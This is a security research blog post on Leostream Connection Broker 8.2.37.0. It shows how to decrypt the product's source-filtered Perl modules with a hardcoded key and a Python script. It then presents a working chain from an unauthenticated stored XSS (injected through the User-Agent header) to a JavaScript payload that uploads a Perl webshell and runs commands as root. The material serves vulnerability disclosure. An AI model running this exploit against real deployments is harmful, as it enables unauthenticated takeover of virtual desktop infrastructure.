---
title: "A brief encounter with Leostream Connect Broker"
date: 2020-10-04 11:58:47 +07:00
modified: 2020-10-05 16:49:47 +07:00
tags: [vulnerabilities, research, X-C3LL]
description: Article about how to decrypt LeoStream Connect Broker files and exploiting a vulnerability to pop a shell as Root
image: 
---

Dear Fell**owl**ship, today's homily is about a journey that begins with a few perl files encrypted by an ancient alchemy called **source filter**, and ends with a shell as root. Please, take a seat and listen to the story.


# Prayers at the foot of the Altar a.k.a. disclaimer
*We reported the vulnerability to Leostream, but the tickets opened within their support platform were refused because we did not provide a customer license. We attempted to contact them again by email and twitter as well with no luck. In this post we talk about version 8.2.37.0, this vulnerability may or may not be present in more recent versions. After all our attempts, and being the support for 8.2 branch ended this September the 30th, we wrote this brief article.*
 
# Introduction

Leostream is a platform used to manage the connections from users to VDI, cloud desktop, and similar stuff. It supports connections through SSH, VNC, Mechdyne TGX, etc. The platform is composed by 3 elements:

- Leostream Gateway
- Leostream Connection Broker
- Client Connector

<figure>
<img src="/Leostream-xss-to-rce/LeostreamArchitecture-01-768x328.png" alt="Leostream architecture"> 
<figcaption>
Leostream Architecture
</figcaption>
</figure>

The Gateway component is usually internet-facing and it is in charge of managing the firewall rules to forward the traffic to the Connection Broker, so it is not a "mandatory" element. In practice, only the Connection Broker and the client are required to manage the configured VDIs. Connection Broker can be also integrated with Active Directory, Radius, VPNs, etc; so pwn one and jackpot! Leostream provides an old Connection Broker version as [VM flavour](https://www.leostream.com/resource/legacy-downloads/), so we can download it and ter it to pieces to check its guts.

The VM comes with default user leo (and same password) so we can easily interact with the filesystem through SSH/SCP. The first thing that caught our attention was... Perl. The entire platform is build on top of Perl scripts. Great, so we can just `cat` and `grep` to find common vulnerability patterns within the scripts... except that we can't. The files are encrypted. **WTF?**

# Diving in Perl forums

The platform is composed by perl scripts (.pl) and perl modules (.pm), being the first just the entry points and the last where the code really lies. The problem is that the perl modules are encrypted, so what you see is:

```perl
use Filter::Crypto::Decrypt;
b417e4be12f3cf2087102a195e8157cbc849a01c1c02b5e2aa53cbc5f787279661222b414e6cd792764042f3975023511
648fd661af27c1754a739e4fbc68a9fd51236cd6cf7b1f28736fa629adeb67b0eec691cb8167b00458fba5ff0a7af95e5
ee071bfccb6c2a1b80c1861db313cd3af37135d3dc385b2c03979e13818536b48d28be12eb1dc93df1a3df5edec2efda8
7a42d094544f751d57848731253e5cef981(..)
```

So we took our whip and hat from that Indiana Jones halloween costume and started to do a bit of archaeological google-fu, finding that encrypted sources in the perl world was a "common" practice in the old days. This encryption is made via ["source filters"](https://perldoc.perl.org/perlfilter.html), which are programs that can be executed between the file is read and it reaches the perl parser. The original encrypted file is read and saved in memory, then the source filters are called and the code is transformed (in our case decrypted) and finally arrives to the parser where it follows the normal flow as any other script.

This "encryption" is futile as we have access to the files and to the whole VM with root privileges, so we can peek directly the memory to check what is going on. The web platform works on an Apache (httpd) with mod_perl, so the process must load at some point a shared object with the logic to decrypt the perl modules. 

```
[leo@localhost tpc]$ sudo cat /proc/$(pidof httpd | cut -d" " -f1)/maps | grep -i filter
7fc86274f000-7fc862753000 r-xp 00000000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
7fc862753000-7fc862953000 ---p 00004000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
7fc862953000-7fc862954000 rw-p 00004000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
```

Let's download and try to figure out how it decrypts the files. Here we are going to explain how old versions of Leostream are encrypted (we are working with 8.2.37.0), but more recent releases use a different approach inside their Decrypt.so. First locate any imported perl function related to parsing:

```
0x00001c20]> ii~parser
  78 0x00000000  GLOBAL  NOTYPE PL_parser
```

Then find cross-references:

```
[0x00001c20]> axF PL_parser
Finding references of flags matching 'PL_parser'...
[0x002046c8-0x00204750] sym.FilterCrypto_FilterDecrypt 0x25d6 [DATA] mov rbp, qword [rip + 0x201cab]
sym.FilterCrypto_FilterDecrypt 0x344f [DATA] mov r12, qword [rip + 0x200e32]
sym.FilterCrypto_FilterDecrypt 0x3450 [DATA] mov esp, dword [rip + 0x200e32]

```

Ok, so that `FilterCrypto_FilterDecrypt` is our target function. When disassembled, it shows OpenSSL functions being called:

```
...
0x00002ae7      488d3d121100.  lea rdi, obj.filter_crypto_pswd ; 0x3c00 ; "D\x9d*\u03abD\xc0AU\x99\x98\x02l*\x9aO\x853\x8f\x19|P\xeb\x96\x18\x97\xb5\xb6\xcc\xee\x0f\x1a"
|           0x00002aee      488b542458     mov rdx, qword [local_58h]  ; [0x58:8]=0 ; 'X'
|           0x00002af3      41b920000000   mov r9d, 0x20               ; "@"
|           0x00002af9      41b800080000   mov r8d, 0x800
|           0x00002aff      be20000000     mov esi, 0x20               ; "@"
|           0x00002b04      48890424       mov qword [rsp], rax
|           0x00002b08      e863efffff     call sym.imp.PKCS5_PBKDF2_HMAC_SHA1
...
0x00003304      e817e7ffff     call sym.imp.EVP_aes_256_cbc
...
```

At this point we know that the files are encrypted with AES-256 in CBC mode and the key is derived using PBKDF2. Also we can observe that the derivation is done to a hardcoded value with the very descriptive name **filter_crypto_paswd**. So we only need to get the IV and the salt to start decrypting files. To grab that info we just uploaded a statically compiled gdbserver and debugged the httpd process. What we observed is: every perl module contains its own IV and salt inside the file:

- 0-7 bytes => salt
- 8-23 bytes => IV
- 24-... => encrypted content

We scripted a simple decrypter:

```python 
#!/usr/bin/env python

# Leostream source code decrypter by X-C3LL (Juan Manuel Fernandez)

import sys
from Crypto.Cipher import AES
import Crypto.Cipher.AES
from binascii import hexlify, unhexlify
from backports.pbkdf2 import pbkdf2_hmac




def unfilter(salt, IV, encrypted):
    password = unhexlify('449d2aceab44c041559998026c2a9a4f85338f197c50eb961897b5b6ccee0f1a') # Hardcoded password
    derived_key = pbkdf2_hmac("sha1", password, salt, 0x800, 32)
    decipher = AES.new(derived_key,AES.MODE_CBC,IV)
    plaintext = decipher.decrypt(encrypted)
    return plaintext

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("python leostream-decrypter.py [SOURCE FILE]")
        exit(-1)
    try:
        with open(sys.argv[1], "r") as file:
            raw = file.read().split("\n")[1]
    except:
        print("[!] Error: file could not be opened!")
        exit(-1)
    decrypted = unfilter(unhexlify(raw[:16]), unhexlify(raw[16:48]), unhexlify(raw[48:]))
    print(decrypted)
```

And now we can start reading source files **:)**:

```
ᐓ    for a in *.pm; do python ../leostream-decrypter.py $a > $a.clean; mv $a.clean $a;done
ᐓ    head -n 6 Index.pm                             
package Index;
use strict;
use AuthCAS;
use CGI::Cookie;
use Crypt::CBC;
use Crypt::Blowfish;
close failed in file object destructor:
sys.excepthook is missing
lost sys.stderr
```

# Finding a stored XSS :( 

With the source code decrypted, understanding how it works internally becomes an easy task. After reading a few files we can observe a common pattern: some (user controlled) data is saved to the database just escaping single quotes to avoid SQL injections, and then this content is showed at other point of the web platform in raw. For example, in WebQuery.pm:

```perl
sub login {
    my $self = shift;
    my $cg = Session->cg;
    my $fl = Session->fl;
    my $tm = Session->tm;

    $fl->set_tmp('using_browser', 1); # Pretend we are a browser
    $fl->set_tmp('switched_view', 1); # and pretend we switched to administrator view

    my $h = libMisc::browser_client();
    $h->{name} = 'Web Query';
    $h->{client_type} = 'web query';
    $h->{device} = 'application';
    my $client_id = Client->find_client($h);
    if ($client_id) {
        # These fields have defaults which shouldn't be overwritten in existing clients
        delete $h->{client_assignment_mode};
        delete $h->{display_layout_assignment_mode};
        Client->new(-id=>$client_id)->save_data($h);
    } else {
        my $client = Client->new(-new=>1);
        $client->save_data($h);
        $client_id = $client->id;
    }
...
```

In this code snippet we can see how the application calls `libMisc::browser_client()`, sets some fields, and then searches the "client". If it is new, then the data is saved to the database. Let's check `browser_client()` from `libMisc.pm`:

```perl
# Return a Client-formatted recordset about the current browser
sub browser_client {
    my $cg = Session->cg;
    my $ua = $cg->user_agent();
    my $make = parse_user_agent($ua);
    my $h = Client->new(-new=>1)->data;
    $h->{name} = substr($make, 0, 255);
    $h->{client_type} = 'browser';
    $h->{manufacturer} = ($ua =~ /\b(?:MSIE|Trident|Edge)\b/ ? 'Microsoft' : 'Other');
    $h->{device} = 'Web browser';
    $h->{device_version} = substr($ua, 0, 4095);
    $h->{client_language} = substr($ENV{HTTP_ACCEPT_LANGUAGE}, 0, 100);
    $h->{client_token} = '';
    $h->{display_count} = 0;
    $h->{location} = '';
    $h->{ip} = substr($ENV{REMOTE_ADDR}, 0, 20);
    $h->{http_header} = http_header_string();

    # FIXME: for language, return as pretty string.  For example, parse:
    # for i in /usr/share/i18n/locales/*; do echo $i; perl -ne '(/^language/ || /^territory/) && print' $i; echo ""; done
    return $h;
}
```

It takes a lot of user-controlled fields that, in the end, are going to be saved to the database as we saw before. The strings are not escaped before they are stored in the database, and also they are not escaped when they are rendered in the web, so we have a stored XSS. 

But... this information is stored before the login credentials are checked, **so we can inject our payload without authentication :)**

```
curl http://remote-target/webquery.pl\?action\=run\&method\=qselect\&user\=AdeptsOf0xCC\&password\=RKL -H "User-Agent: <script>alert(/pwned/)</script>"
```

As stated before, this same code pattern can be spoted in other files.

# Turning the lousy XSS into an RCE as root :)

The recipe to turn an XSS into an RCE in any web platform is usually the same:
- 4oz plugin uploader
- A few drops of injected JavaScript

But this time our XSS-to-RCE-cupcake has a twist: internal URLs are protected by a digest to avoid anti-tampering, so we can not just upload our webshell directly with a request. Let's dig a bit into this.

Leostream protects the URLs from tampering adding a parameter, `r`, with a digest value that is generated via `digest_of_url` from `libMisc.pm`:

```perl
...
my $digest = md5_base64((join '!',
                             grep {/^(mb_|action|r|[^=]*[u_]id)/}
                             split /[;&]/, $url)
                            . $digest_secret);

    # Take only the first 7 url-safe characters.  (In tests with an unchanging r value,
    # this algorithm produced only 2 duplicate keys in 3,000,000 uid/thing_id combinations.)
    $digest =~ s/[^a-zA-Z0-9_.-]//g;
    $digest = substr($digest,0,7);

    return $digest;
```

This digest has a random component that is updated every time, so if you refresh the web the `r` values are changed:
```
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=J0qimdk1465
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=DyslJw14661
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=nnAy09Q7683
...
```
Here are our problems: 

- **Problem #1**: we can not predict this value, so we can not just send a POST request to upload our webshell. We need to force the navigation and extract the `r` generated.
- **Poblem #2**: the form used to upload third-party compontents is located inside a subsection. We first need to go to the "section", and then navigate to the "subsection", also filling some forms in the way.

Solution: two iframes. Not a charming solution, but it works. Our payload should:
1. Locate the link to the "system" section. We can get it accessing the DOM (`document.getElementsByTagName("a")[4]["href"]`)
2. Open an iframe to this location (iframe "pwn1")
3. Wait until it is loaded and extract the link to the subsection "Maintance" from its DOM (`window.frames["pwn1"].contentDocument.getElementsByTagName("a")[14]["href"]`)
4. Create a new iframe to this new location (iframe "pwn2") and wait for it to load
5. Find the form inside this second iframe and auto-submit it setting the value to "Upload third-party content" (`window.frames["pwn2"].contentDocument.forms[0]["todo"].value = "upload_tpc"`)
6. Wait until the iframe is reloaded (because of the submited form)
7. Now finally we are at the "upload file" form (`window.frames["pwn2"].contentDocument.forms[0]["action"]`) and we can read the URL to do the request to upload our webshell (just `fetch()`).

Here is our (crappy) final payload (it just executes a `sudo id`):

```javascript
// PoC for XSS in Leostream by X-C3LL (Juan Manuel Fernandez)
var i = document.createElement("iframe");
var check = 0;
i.setAttribute("src", document.getElementsByTagName("a")[4]["href"]);
i.setAttribute("id", "pwn1");
i.addEventListener("load", function() {
    //Wait to load the iframe and then submit the form to go to the page where we can upload the file

    var f = document.createElement("iframe");
    f.setAttribute("src", window.frames["pwn1"].contentDocument.getElementsByTagName("a")[14]["href"]);
    f.setAttribute("id", "pwn2");
    f.addEventListener("load", function() {
        if (check == 0) {
            window.frames["pwn2"].contentDocument.forms[0]["todo"].value = "upload_tpc"
            window.frames["pwn2"].contentDocument.forms[0].submit()
            check = 1;
        }
        else {
            fetch(window.frames["pwn2"].contentDocument.forms[0]["action"], {
                "credentials": "include",
                "headers": {
                "User-Agent": "Swag Owl",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
                "Content-Type": "multipart/form-data; boundary=---------------------------342766341182433198532876615",
                "Upgrade-Insecure-Requests": "1"
            },
            "referrer": "http://owlland/config.pl?uid=h5wxiUFQp6yF4RfDRw14AmRkMGDdxSoGR0kuU3QP9Q;_multi_part_form=1;mb_config=maintenance;maintenance_act=upload_tpc;r=k3snhvj7694",
            "body": "-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_form_has_changed\"\r\n\r\n0\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"uid\"\r\n\r\n" + window.frames["pwn2"].contentDocument.forms[0]["uid"].value + "\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_FORM_SUBMIT\"\r\n\r\n1\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_RAN\"\r\n\r\n99993948\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_STRIP\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_FORM_POSITION\"\r\n\r\n0\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_DATA_FIELDS\"\r\n\r\nfile_name\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_NUMBER_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_POPUP_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_NETMASK_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_IP_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_IP_FIELDS_NUMERIC\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_GT_ZERO_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_GE_ZERO_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_EMAIL_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_PASSWORD_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_FILE_FIELDS\"\r\n\r\nfile_name\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_REQUIRED_FIELDS\"\r\n\r\nfile_name\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_UNIQUE_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_HIDDEN_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_multi_part_form\"\r\n\r\n1\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"file_name\"; filename=\"0xCC.pl\"\r\nContent-Type: text/x-perl-script\r\n\r\nprint `sudo id`;\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"mb_config\"\r\n\r\nmaintenance\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"maintenance_act\"\r\n\r\nupload_tpc\r\n-----------------------------342766341182433198532876615--\r\n",
            "method": "POST",
            "mode": "cors"
            });
        }  
    });

    document.body.appendChild(f);
    
    
});
document.body.appendChild(i);
``` 
And finally:

```
ᐓ   curl http://192.168.0.20/tpc/0xCC.pl
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
**:)**

# EoF

This wasn't really a holy bug, however discovering it was fun because we had to learn a bit about ancient horrors like source filters. We hope you enjoyed this reading! 

Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).

